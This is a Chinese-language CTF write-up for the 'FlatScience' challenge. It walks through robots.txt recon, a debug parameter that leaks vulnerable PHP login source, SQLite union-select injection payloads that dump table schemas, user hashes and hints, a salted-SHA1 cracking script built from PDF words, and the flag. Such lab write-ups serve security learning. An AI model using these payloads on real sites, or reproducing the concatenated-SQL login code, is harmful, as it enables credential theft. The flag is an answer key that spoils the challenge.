# FlatScience

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=25991ba8-527f-443a-a66b-9c9d79a29162_2)

我真的过于菜了。这题其实不难。

![website](../../images/FlatScience.png)

这好像是个论文网站，一个一个链接点击去发现还真是pdf格式的论文。到处乱翻没啥收获，看下有没有robots.txt。

- User-agent: *<br>Disallow: /login.php<br>Disallow: /admin.php

这下就暴露了两个很重要的文件了。login.php就是普通登录框，admin.php是管理员登录，很有可能是我们的目标。admin.php里有这样一句话“do not even try to bypass this”，意为不要想着绕过登录。ctf里有好多此地无银三百两的注释，所以我以为这里就是要绕过登录……试了半天发现不行，结果去login.php一下就报错了。原来这次的注释是真的(⌒-⌒; )

然后猜闭合。'号报错但"没有报错，看来是单引号闭合形式。直接上union select，在列数为2的时候没有报错，但是不知道为什么返回了首页。回到login.php检查源代码，发现了一个可疑的注释：TODO: Remove ?debug-Parameter!

?debug参数……get传参？

```php
<?php
ob_start();
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">

<html>
<head>
<style>
blockquote { background: #eeeeee; }
h1 { border-bottom: solid black 2px; }
h2 { border-bottom: solid black 1px; }
.comment { color: darkgreen; }
</style>

<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<title>Login</title>
</head>
<body>


<div align=right class=lastmod>
Last Modified: Fri Mar  31:33:7 UTC 1337
</div>

<h1>Login</h1>

Login Page, do not try to hax here plox!<br>


<form method="post">
  ID:<br>
  <input type="text" name="usr">
  <br>
  Password:<br> 
  <input type="text" name="pw">
  <br><br>
  <input type="submit" value="Submit">
</form>

<?php
if(isset($_POST['usr']) && isset($_POST['pw'])){
        $user = $_POST['usr'];
        $pass = $_POST['pw'];

        $db = new SQLite3('../fancy.db');
        
        $res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");
    if($res){
        $row = $res->fetchArray();
    }
    else{
        echo "<br>Some Error occourred!";
    }

    if(isset($row['id'])){
            setcookie('name',' '.$row['name'], time() + 60, '/');
            header("Location: /");
            die();
    }

}

if(isset($_GET['debug']))
highlight_file('login.php');
?>
<!-- TODO: Remove ?debug-Parameter! -->




<hr noshade>
<address>Flux Horst (Flux dot Horst at rub dot flux)</address>
</body>
```

这就出来源代码了？根据源代码可知，我们的查询结果会被放到根目录的cookie中。难怪刚刚没有回显反而回到了首页。查看cookie的值可以发现是“+2”，那么2就是会回显的列。接下来就是日常的一条龙服务了。注意这里使用的是sqlite，和sql有些许不同。例如sqlite中sqlite_master表保存数据库表的关键信息，而不是information_schema。

- ### sqlite_master
  > CREATE TABLE sqlite_master (<br>type text,<br>name text,<br>tbl_name text,<br>rootpage integer,<br>sql text<br>);

查询表时，type 字段永远是’table’,name 永远是表的名字。tbl_name可以用于索引查询，即type 等于 ‘index’。name 则是索引的名字，tbl_name 是该索引所属的表的名字。

- ' union select 1,group_concat(name) from sqlite_master where type='table'--+

看到有个叫Users的表。

- ' union select 1,group_concat(sql) from sqlite_master where name='Users'--+
> +CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29

看看这些字段都是啥。

- ' union select 1,id from Users limit 1,1--+
- ' union select 1,name from Users limit 1,1--+
- ' union select 1,password from Users limit 1,1--+
- ' union select 1,hint from Users limit 1,1--+

> id name password hint<br>1 admin 3fab54a50e770d830c0416df817567662a9dc85c +my+fav+word+in+my+fav+paper?!<br>2 fritze 54eae8935c90f467427f05e4ece82cf569f89507 +my+love+is…?<br>3 hansi 34b0bb7c304949f9ff2fc101eef0f048be10d3bd +the+password+is+password

这里利用了limit进行移位查询。

- ### limit
  > LIMIT 子句可以被用于强制 SELECT 语句返回指定的记录数。<br>LIMIT 接受一个或两个数字参数。参数必须是一个整数常量。<br>如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目。<br>初始记录行的偏移量是 0(而不是 1)

所以' union select 1,name from Users limit 1,1--+可以查询Users中name字段第一行的数据，' union select 1,name from Users limit 2,1--+可以查询Users中name字段第二行的数据……以此类推。

或者也可以直接 ' union select 1,group_concat(name) from Users--+ ，一次查完全部数据。

根据 \$res = \$db->query("SELECT id,name from Users where name='".\$user."' and password='".sha1($pass."Salz!")."'"); 可以得知 明文密码+Salz! 的sha1值就是password。偷懒的方法是放到[这里](https://www.somd5.com/)解密，而正确做法是爬取全部pdf论文然后一个一个试（根据my+fav+word+in+my+fav+paper?!提示得出）

直接上大佬的代码吧，我很明显是属于偷懒那拨人的。

```python
from cStringIO import StringIO
from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter
from pdfminer.converter import TextConverter
from pdfminer.layout import LAParams
from pdfminer.pdfpage import PDFPage
import sys
import string
import os
import hashlib

def get_pdf():
    return [i for i in os.listdir("./") if i.endswith("pdf")]


def convert_pdf_2_text(path):
    rsrcmgr = PDFResourceManager()
    retstr = StringIO()
    device = TextConverter(rsrcmgr, retstr, codec='utf-8', laparams=LAParams())
    interpreter = PDFPageInterpreter(rsrcmgr, device)
    with open(path, 'rb') as fp:
        for page in PDFPage.get_pages(fp, set()):
            interpreter.process_page(page)
        text = retstr.getvalue()
    device.close()
    retstr.close()
    return text


def find_password():
    pdf_path = get_pdf()
    for i in pdf_path:
        print "Searching word in " + i
        pdf_text = convert_pdf_2_text(i).split(" ")
        for word in pdf_text:
            sha1_password = hashlib.sha1(word+"Salz!").hexdigest()
            if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c':
                print("Find the password :" + word)
                exit()

if __name__ == "__main__":
```

- ### Flag
- > flag{Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?}
